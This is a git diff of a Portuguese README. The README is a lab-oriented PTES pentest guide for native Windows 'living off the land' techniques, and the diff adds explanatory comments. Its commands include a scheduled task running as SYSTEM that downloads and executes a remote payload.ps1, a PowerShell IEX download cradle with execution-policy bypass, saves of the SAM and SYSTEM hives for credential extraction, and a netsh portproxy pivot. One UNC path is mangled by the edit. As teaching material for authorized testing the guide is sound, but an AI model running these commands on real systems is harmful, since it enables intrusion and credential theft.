@@ -10,6 +10,7 @@ Aqui o ataque acontece como no mundo real:
 ---
 ![Fluxo PTES – Simulação Gray Box e Assumed Breach](docs/PTES_SIMULAÇÃO.png)
 ---
+
 ## Aviso crítico (2026)
 
 ⚠️ **IMPORTANTE**
@@ -26,11 +27,10 @@ Resumo honesto:
 Se rodar isso fora de um lab → **não é pentest, é BO**.
 
 ---
-[Trilha sonora para acompanhar --> clique aqui!](https://www.youtube.com/watch?v=ProwCLCppgo&list=RDWgETDKFkDEE&index=9)
-
----
 
 ## Fases PTES adaptadas para Windows nativo
+
+> Comentário: mapeamento direto entre o PTES tradicional e atividades possíveis apenas com ferramentas nativas do Windows (LOLBins).
 
 | Fase PTES | Ferramentas nativas | Objetivo |
 |---------|-------------------|----------|
@@ -44,8 +44,9 @@ Se rodar isso fora de um lab → **não é pentest, é BO**.
 
 ---
 
-
 ## Ambiente de teste sugerido
+
+> Comentário: cenário de *assumed breach*, com acesso inicial e credenciais low-priv.
 
 - **Atacante:** Windows 11 (PC ou VM)
 - **Vítima:** Windows 10/11 (VM)
@@ -57,15 +58,21 @@ Se rodar isso fora de um lab → **não é pentest, é BO**.
 
 ## 1. Intelligence Gathering (Recon)
 
+> Comentário: fase de reconhecimento inicial para entender identidade, sistema, rede e superfície de ataque.
+
 ### Identidade e contexto
 
 ```powershell
 whoami /all
 ```
 
+> Comentário: identifica usuário, grupos, privilégios e contexto de execução.
+
 ```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
+
+> Comentário: coleta informações do SO e arquitetura.
 
 ### Ping sweep simples
 
@@ -76,6 +83,8 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
   "ip.$_"
 }
 ```
+
+> Comentário: enumeração básica de hosts ativos.
 
 ### DNS lookup
 
@@ -90,21 +99,29 @@ server 8.8.8.8
 www.alvo.com
 ```
 
+> Comentário: valida resolução DNS.
+
 ### Portas em escuta
 
 ```cmd
 netstat -ano | findstr "LISTENING"
 ```
 
+> Comentário: identifica serviços ativos e PIDs.
+
 ### Shares visíveis
 
 ```cmd
-net view \\ip
+net view \ip
 ```
+
+> Comentário: enumera compartilhamentos SMB.
 
 ---
 
 ## 2. Vulnerability Analysis (Enumeração)
+
+> Comentário: identificação de falhas de configuração e superfícies exploráveis.
 
 ### Patches instalados
 
@@ -112,11 +129,15 @@ net view \\ip
 Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 10
 ```
 
+> Comentário: verifica atrasos de patching.
+
 ### Serviços em execução
 
 ```powershell
 Get-Service | Where-Object {$_.Status -eq "Running"} | Select Name, DisplayName, Status
 ```
+
+> Comentário: identifica serviços que podem ser abusados.
 
 ### Usuários e grupos locais
 
@@ -132,6 +153,8 @@ net localgroup administrators
 Get-LocalUser | Select Name, Enabled, LastLogon
 ```
 
+> Comentário: enumeração de contas e privilégios.
+
 ### Firewall
 
 ```powershell
@@ -139,6 +162,8 @@ Get-NetFirewallRule |
 Where-Object {$_.Enabled -eq $true -and $_.Direction -eq "Inbound"} |
 Select DisplayName, Action, Protocol
 ```
+
+> Comentário: identifica regras permissivas.
 
 ### WMI
 
@@ -150,9 +175,13 @@ Get-WmiObject -Class Win32_ComputerSystem
 Get-WmiObject -Class Win32_LogicalDisk -ComputerName ip
 ```
 
+> Comentário: coleta informações de sistema e discos.
+
 ---
 
 ## 3. Exploitation (Living-off-the-Land)
+
+> Comentário: execução e movimento usando apenas binários legítimos do Windows.
 
 ### WinRM / PowerShell Remoting
 
@@ -161,6 +190,8 @@ Na vítima (uma vez):
 ```powershell
 Enable-PSRemoting -Force
 ```
+
+> Comentário: habilita gerenciamento remoto.
 
 Do atacante:
 
@@ -172,11 +203,15 @@ Enter-PSSession -ComputerName ip -Credential (Get-Credential)
 whoami
 ```
 
+> Comentário: valida execução remota.
+
 ### Execução remota via Scheduled Task
 
 ```cmd
 schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')" /SC once /ST 00:00 /F
 ```
+
+> Comentário: execução como SYSTEM.
 
 ### Método legado
 
@@ -184,9 +219,13 @@ schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Ob
 at \\ip 07:30 "cmd /c whoami > C:\temp\owned.txt"
 ```
 
+> Comentário: técnica antiga ainda funcional.
+
 ---
 
 ## Download & Exec com LOLBins
+
+> Comentário: download e execução usando ferramentas assinadas pela Microsoft.
 
 ### certutil
 
@@ -209,6 +248,8 @@ powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://
 ---
 
 ## 4. Post Exploitation
+
+> Comentário: persistência, coleta de dados e pivoting.
 
 ### Persistência (Registry Run)
 
@@ -235,6 +276,8 @@ reg save HKLM\SAM C:\temp\sam.hive
 reg save HKLM\SYSTEM C:\temp\system.hive
 ```
 
+> Comentário: extração de material sensível.
+
 ### Pivoting
 
 ```cmd
@@ -244,6 +287,8 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 ---
 
 ## 5. Reporting
+
+> Comentário: coleta de evidências.
 
 ```powershell
 whoami /all > C:\temp\report.txt
@@ -268,7 +313,7 @@ Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\evidence.zip
 - Enumeração limitada sem scanners dedicados  
 - Dependência de misconfigurations  
 - Alta detecção por Defender / EDR  
-- Extremamente forte em Active Directory
+- Extremamente forte em Active Directory  
 
 ---
 
@@ -277,4 +322,4 @@ Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\evidence.zip
 > Se isso passa batido no SOC, o problema não é o ataque.  
 > É o SOC.
 
-Windows contra Windows.  
+Windows contra Windows.
